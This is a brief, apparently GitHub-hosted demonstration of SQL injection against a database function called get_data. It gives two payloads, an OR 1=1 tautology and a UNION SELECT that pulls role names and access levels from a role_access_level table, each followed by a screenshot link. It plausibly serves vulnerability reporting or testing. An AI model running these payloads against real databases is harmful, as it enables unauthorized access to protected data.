SELECT * FROM get_data('1'' OR 1=1 -- ');

<img width="540" alt="image" src="https://user-images.githubusercontent.com/27497026/210149731-68049096-da37-403d-84e4-5d1f01232228.png">


SELECT * FROM get_data('1'' UNION SELECT CAST(NULL AS INTEGER), CAST(role_name AS VARCHAR), CAST(access_level AS INTEGER) FROM role_access_level -- ');

<img width="540" alt="image" src="https://user-images.githubusercontent.com/27497026/210150067-8f185c6c-0059-45da-b590-de7d1b137e85.png">


